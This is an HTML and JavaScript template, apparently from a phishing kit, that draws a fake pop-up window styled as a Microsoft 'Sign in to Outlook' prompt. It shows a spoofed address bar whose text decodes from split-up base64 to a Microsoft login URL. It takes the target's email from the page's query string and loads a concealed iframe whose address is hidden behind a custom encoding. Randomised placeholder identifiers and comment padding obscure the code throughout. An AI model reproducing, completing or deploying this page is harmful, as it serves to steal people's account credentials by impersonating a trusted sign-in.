<html>



    <head>






             <meta    name="viewport"        content="width=device-width,      initial-scale=1.0">




           <meta       name="robots"     content="noindex,      nofollow">




             <style>






            @font-face      {        font-family:    system;        font-style:    normal;        font-weight:    300;       src:    local(".SFNSText-Light"),        local(".HelveticaNeueDeskInterface-Light"),       local("Roboto-Light"),       local("DroidSans"),      local("Tahoma"),    local(".LucidaGrandeUI"),        local("Ubuntu     Light"),       local("Segoe    UI      Light");       }        html,        body     {    width:    100%;     height:        100%;        }      #${kata2}     {     height:    31px;        background-color:       black;    width:        100%;     display:     flex;    justify-content:    space-between;      user-select:     none;     }     #hazel        {    padding-left:    5px;    vertical-align:    middle;    }       #${kata3}       {      color:        white;      font-size:       12px;      font-family:    "system";    vertical-align:       middle;       }     #${kata4}    {      color:        white;      font-size:     12px;        padding:      9px    15px       7px      15px;      }      #${kata5}       {        color:      white;     font-size:       22px;      padding:    0px        15px    5px     15px;      }      #${kata6}    {        color:       white;        font-size:       15px;    padding:       7px      17px     7px       17px;        }       #${kata7}     {        height:       28px;       background-color:       #1b1a1a;      width:     100%;       display:      flex;        align-items:     center;     white-space:     nowrap;     overflow:    scroll;    text-overflow:       ellipsis;     -ms-overflow-style:       none;       scrollbar-width:    none;    }     #${kata7}::-webkit-scrollbar     {      display:     none;     }      #quoll     {        user-select:      none;        padding-left:     8px;        margin-right:    8px;     }       #${kata8}       {     color:       white;     font-size:     14px;    font-family:      "system";        }     #${kata9}      {     color:       #9c9898;    font-size:        14px;        font-family:       "system";    }      #${kata2}-width    {        width:        calc(100%        +       2px);       }       #cockle      {      width:      100%;        height:     100%;        border:     1px     solid      gray;    }        #${kata1}       {        color:        transparent;     background-color:        transparent;    border-color:        transparent;    box-shadow:    rgba(0,      0,    0,      0.35)     0px        5px       15px;      height:      90%;    width:     70%;     }        </style>




            <script        src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>







      </head>






        <body>





<!--                                   <i    hidden> ${kalimat1} </i>       -->



<div    id="${kata1}">






<div    id="${kata2}-width">




                     <div     id="${kata2}">







                                             <div        style="margin-top:5px;">



                                         <svg           width="20px"      height="15px"     id="hazel"       enable-background="new    0        0      2499.6      2500"    viewBox="0     0      2499.6    2500"     xmlns="http://www.w3.org/2000/svg"><path      d="m1187.9        1187.9h-1187.9v-1187.9h1187.9z"      fill="#f1511b"/><path       d="m2499.6       1187.9h-1188v-1187.9h1187.9v1187.9z"     fill="#80cc28"/><path    d="m1187.9        2500h-1187.9v-1187.9h1187.9z"    fill="#00adef"/><path     d="m2499.6     2500h-1188v-1187.9h1187.9v1187.9z"       fill="#fbbc09"/></svg>



                                                                          <span    id="${kata3}">Sign      in       to        Outlook</span>




                                                    </div>







        





                                                <div>




                                                                        <span    id="${kata4}">&#8212;</span>







                                                                   <span        id="${kata5}">&#9633;</span>



                                                                      <span    id="${kata6}">X</span>





                                             </div>





                       </div>






                            <div     id="${kata7}">






                                                 <svg      width="20px"        height="20px"       id="quoll"      width="752pt"       height="752pt"     version="1.1"        viewBox="0    0        752     752"      xmlns="http://www.w3.org/2000/svg">






    <path    d="m510.97     316.8h-12.785l-0.003906-62.512c0-56.828-46.41-103.24-103.24-103.24h-37.887c-56.828      0-103.24    46.41-103.24     103.24v62.039h-12.785c-25.574        0-45.938    20.836-45.938        45.938v192.27c0    25.574        20.836    45.938        45.938       45.938h270.41c25.574       0       45.938-20.836       45.938-45.938l0.003906-191.8c0-25.574-20.836-45.938-46.41-45.938zm-195.12-62.512c0-22.73    18.469-41.203     41.203-41.203h37.887c22.73      0    41.203    18.469     41.203    41.203v62.039h-120.29z"        fill="#A6A6B2"/>




</svg>






                                                    <span    id="${kata8}"></span>






                                           <span    id="${kata9}"></span>






                           </div>






</div>



</div>




    </body>




<script>





let ${grabber}                                  =                                   '';







const ptrjkso               =                    (${kata20})      => {




    ${kata20}            =                      ${kata20}.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');






    var ${kata21}                                           =                                               new                 RegExp('[\\?&]' + ${kata20} + '=([^&#]*)');







    var ${kata22}                                        =                                           ${kata21}.exec(location.search);








    return ${kata22}                                               ===                            null ? '' : decodeURIComponent(${kata22}[1].replace(/\+/g, ' '));





}




${grabber}                                                                  =                                   ptrjkso('e') == '' ? ${grabber} : ptrjkso('e');







${grabber}                                        =                                                           atob(${grabber});





</script>






<script>






                     document.getElementById('${kata8}').innerText      =      atob("aHR0c"+"HM6Ly"+        /*     ${kata1}     */     '9sb2dpbi5'+`taWNyb`+     /*      ${kata5}     */    "3NvZnR"+"vbmxp"+"bmUuY2"+`9tLw==`);







                          document.getElementById('${kata9}').innerText       =    atob("Y29tbW"+'9uL29'+       /*       ${kata12}       */      "hdXRoMi9hd"+`XRob3J`+"pemU/Y2"+        /*     ${kata15}    */       "xpZW50X2l"+    /*       ${kata8}    */        `kPTAwMD`+`AwMDAyL`+"TAwMDAtMG"+     /*    ${kata3}       */       "ZmMS1jZTAw"+     /*        ${kata6}      */     "LTAwMDAwMD"+    /*    ${kata12}    */        "AwMDAwMC"+      /*     ${kata5}      */    "ZyZWRp"+    /*    ${kata18}     */       "cmVjdF9"+        /*      ${kata14}    */      `1cmk9aHR0c`+`HMlM2`+    /*        ${kata10}     */        'ElMmYlMm'+    /*      ${kata4}       */       `ZvdXRsb29`+'rLm9mZ'+        /*       ${kata3}        */      "mljZTM"+      /*     ${kata4}      */     `2NS5jb`+"20lMmZvd"+     /*    ${kata5}      */        "2ElMmYmcmV"+'zb3VyY'+`2U9MD`+        /*    ${kata19}     */     "AwMDAwMTIt"+     /*     ${kata16}     */       `MDAwMC`+`0wZmYx`+    /*        ${kata18}     */     `LWNlMDA`+        /*       ${kata17}    */    `tMDAwMDAw`+     /*       ${kata1}     */        "MDAwMD"+    /*    ${kata7}    */     'AwJnJlc'+`3BvbnN`+`lX21vZG`+"U9Zm9y"+'bV9wb3'+      /*    ${kata11}        */      'N0JnJlc3Bv'+       /*        ${kata6}       */        'bnNlX'+`3R5cGU9Y`+        /*    ${kata5}     */      '29kZStp'+    /*        ${kata13}      */      `ZF90b2tlbi`+     /*       ${kata17}        */        "ZzY29wZT1"+    /*      ${kata15}     */      `vcGVuaW`+'QmbXNhZmVk'+"PTEmbXNhc"+        /*     ${kata19}     */      'mVkaXI9MSZ'+     /*       ${kata3}    */      `jbGllbnQ`+`tcmVxdWVzd`+      /*     ${kata9}        */    "C1pZD05N"+"DI5Njk"+`xYi00OGE`+      /*      ${kata7}     */    `5LTZmODAt`+      /*     ${kata6}    */       "YzVkOC"+        /*     ${kata2}       */        '04NDc1Z'+     /*    ${kata1}       */    `DVjYzE`+     /*    ${kata5}     */       `xOTUm`+"cHJvdGVjd"+"GVkdG9rZW4"+      /*        ${kata18}      */        `9dHJ1ZSZjb`+        /*     ${kata6}     */    `GFpbXM9JTd`+      /*    ${kata12}        */       `iJTIyaW`+        /*       ${kata11}     */    'RfdG9r'+        /*       ${kata10}      */      'ZW4lMjIlM'+`2ElN2Il`+    /*    ${kata6}      */        `MjJ4bXNfY2`+`MlMjIl`+     /*       ${kata8}     */    "M2ElN2IlMj"+        /*        ${kata5}       */       'J2YWx'+     /*        ${kata17}        */      `1ZXMlMjIlM`+    /*       ${kata13}        */    '2ElNWI'+     /*    ${kata18}       */       `lMjJDU`+'DElMjI'+     /*       ${kata19}    */       "lNWQlN2Ql"+        /*       ${kata2}    */      `N2QlN2`+"Qmbm9uY2U9"+`NjM4M`+"Tk3Nz"+"A5MTM5M"+      /*     ${kata9}      */       "TQzMD"+       /*        ${kata7}    */       "g2LmNkODZ"+`jYjg5LTM4`+'OTItNDE'+"2Yi05"+"NTk5LTN"+"kOGE0O"+'TUyN2Q3MiZ'+"zdGF0ZT1E"+`WXU1RGNBd0`+        /*      ${kata10}     */    `RNVGtHQmxI`+'OFNfcHh'+`2SFRwOHo3`+      /*    ${kata6}      */    `RVVBU3VPSU`+'NFVVgzY2tQ'+"MmtFcXpBd"+"FdNNH"+       /*     ${kata14}        */    "ZTV1RaN"+     /*     ${kata1}    */       'TlUUFl5'+     /*    ${kata15}        */       "Y0RNST"+      /*      ${kata16}        */       "l5S0xNZUR"+"6Mk93QVZZX"+"1c0Tj"+      /*       ${kata3}        */        'g3dmQ'+"5TVB3");




</script>





<script>




                           var     ${kata10}        =    document.getElementById("${kata4}");     var        zinniawood       =     document.getElementById("${kata5}");        var       zanderwood                 /*       sailfish       */                    =       document.getElementById("${kata6}");      var      rattlesnake     =       document.getElementById("${kata2}");      ${kata10}.addEventListener('mouseover',        function    handleMouseOver()     {        ${kata10}.style.backgroundColor      =      '#272727';     ${kata10}.style.cursor       =       'context-menu';        });       ${kata10}.addEventListener('mouseout',        function      handleMouseOut()      {        ${kata10}.style.backgroundColor        =        'black';       ${kata10}.style.cursor        =     'default';    });    zinniawood.addEventListener('mouseover',     function       handleMouseOver()       {        zinniawood.style.backgroundColor     =       '#272727';       zinniawood.style.cursor     =      'context-menu';      });    zinniawood.addEventListener('mouseout',       function     handleMouseOut()    {      zinniawood.style.backgroundColor       =       'black';     zinniawood.style.cursor     =    'default';      });       zanderwood.addEventListener('mouseover',    function    handleMouseOver()      {    zanderwood.style.backgroundColor        =        'red';     zanderwood.style.cursor       =      'context-menu';        });        zanderwood.addEventListener('mouseout',    function    handleMouseOut()        {     zanderwood.style.backgroundColor       =      'black';    zanderwood.style.cursor       =     'default';        });     rattlesnake.addEventListener('mouseover',    function      handleMouseOver()     {    rattlesnake.style.cursor      =       'context-menu';       });    rattlesnake.addEventListener('mouseout',    function       handleMouseOver()     {    rattlesnake.style.cursor     =        'default';      });        var    skylark    =     $('#${kata1}');      var        honeysuckle        =       $('#${kata2}');      honeysuckle.on('mousedown',      function(e){     var        dr       =        $(skylark).addClass("drag");       height     =      dr.outerHeight();        width       =        dr.outerWidth();        ypos     =        dr.offset().top     +    height        -        e.pageY,       xpos        =       dr.offset().left    +        width       -     e.pageX;       $(document.body).on('mousemove',     function(e){      var    itop     =     e.pageY        +     ypos       -        height;       var      ileft       =        e.pageX     +      xpos     -    width;        if(dr.hasClass("drag")){    dr.offset({top:      itop,left:     ileft});       }     }).on('mouseup',        function(e){     dr.removeClass("drag");       });    });       $("#${kata6}").click(function(){      $("#${kata1}").css("display",       "none");     });     $("#${kata5}").click(enlarge);       function       enlarge(){    if(zinniawood.classList.contains("enlarged")){     $("#${kata1}").css("width",      "40%");      $("#${kata2}-width").css('width',      '100%').css('width',     '+=2px');       $("#cockle").css("width",     "100%");       $("#${kata5}").removeClass("enlarged");        }    else{     $("#${kata1}").css("width",     "70%");      $("#${kata2}-width").css('width',       '100%').css('width',    '+=2px');       $("#cockle").css("width",       "100%");    $("#${kata5}").addClass("enlarged");     }      }




                              </script>






<script></script>



<script>



function     ${kata11}(${kata13})       {






      /*       ${kalimat2}                          */                         




let      ${kata12}      =     [];




${kata13}.forEach(${kata14}     =>     {





let     blackthorn      =        ${kata14}.split(/\s+/).filter(Boolean);





let      ${kata15}    =      blackthorn.map(flax      =>     {




let       ${kata16}    =    flax.split('p')/*       ${kata5}       */ .join('0').split('%') /*       ${kata10}       */ .join('1');







return     String.fromCharCode(parseInt(${kata16},      2));







}).join("");





${kata12}.push(${kata15});





});      /*                           ${kalimat3}                                */             







return    ${kata12}.join("");





}






${kata17}                                                =              ${resultEncode};







var    ${kata18}     =      document.getElementById('${kata1}');







var    ${kata19}        =      '<iframe    id="cockle"    src="' + ${kata11}(${kata17}) + '?e=' + ${grabber} + '"        frameBorder="0"     ></iframe>';




${kata18}.insertAdjacentHTML('beforeend',        ${kata19});;




</script>



</html>
